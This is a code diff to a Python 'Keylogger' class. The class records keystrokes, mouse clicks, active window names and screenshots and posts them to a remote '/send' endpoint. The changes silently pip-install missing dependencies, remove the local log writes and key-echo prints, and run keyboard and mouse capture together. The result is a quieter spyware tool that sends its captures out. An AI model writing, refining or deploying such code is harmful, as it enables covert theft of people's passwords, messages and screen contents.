@@ -1,20 +1,25 @@
-from win32gui import GetWindowText, GetForegroundWindow
-from pynput.keyboard import Listener as KeyListener
-from pynput.mouse import Listener as MouseListener
-from subprocess import call
-import time
-import datetime
-import platform
-import json
-import requests
-import os
-import io
-import base64
-from PIL import ImageGrab
-import win32clipboard
-from pynput import mouse
-from dotenv import load_dotenv
-load_dotenv()
+try:
+    from win32gui import GetWindowText, GetForegroundWindow
+    from pynput.keyboard import Listener as KeyListener
+    from pynput.mouse import Listener as MouseListener
+    from subprocess import call
+    import time
+    import datetime
+    import platform
+    import json
+    import requests
+    import os
+    import io
+    import base64
+    from PIL import ImageGrab
+    import win32clipboard
+    from pynput import mouse
+    from dotenv import load_dotenv
+    load_dotenv()
+except ModuleNotFoundError:
+    from subprocess import call
+    modules = ["pynput", "requests", "Pillow", "pywin32", "python-dotenv"]
+    call("pip install " + ' '.join(modules), shell=True)
 
 class Keylogger:
     log_dir = r"./data/"
@@ -69,6 +74,8 @@ class Keylogger:
                 "type": "screenshot",
                 "screenshot": encoded_string
             })
+            
+            print("Screenshot captured")
         except Exception as e:
             print("Error occurred while capturing screenshot: ", e)
 
@@ -105,8 +112,6 @@ class Keylogger:
 
                 elif (key == "enter" or (datetime.datetime.now() - self.elapsed_time).total_seconds() > 30):
                     self.stringKey = ' '.join(self.stringKey)
-                    f.write("==> " + time + ": " + appName +
-                            " - " + self.stringKey + "\n")
 
                     self.send_data('/send', {
                         "time": time,
@@ -118,7 +123,6 @@ class Keylogger:
                     self.stringKey = ""
                     self.elapsed_time = datetime.datetime.now()
 
-            f.write(time + ": " + appName + " - " + key + "\n")
             self.send_data('/send', {
                 "time": time,
                 "appName": appName,
@@ -128,14 +132,9 @@ class Keylogger:
             f.close()
 
     def on_press(self, key):
-        print(key)
-        print(self.get_app_name() + " - " + str(key))
         if (self.get_active_window() != self.appName or str(key) == "Key.enter"):
             self.capture_screen()
             self.appName = self.get_active_window()
-
-        self.writeLog(self.log_dir, self.get_date_time(),
-                      self.get_active_window(), str(key))
 
     def on_click(self, x, y, button, pressed):
         click = "Left Click"
@@ -167,6 +166,12 @@ class Keylogger:
         return response
 
     def run(self):
-        with MouseListener(on_click=self.on_click) as listener:
-            with KeyListener(on_press=self.on_press) as listener:
-                listener.join()
+        # Setup the listener threads
+        keyboard_listener = KeyListener(on_press=self.on_press)
+        mouse_listener = MouseListener(on_click=self.on_click)
+
+        # Start the threads and join them so the script doesn't end early
+        keyboard_listener.start()
+        mouse_listener.start()
+        keyboard_listener.join()
+        mouse_listener.join()
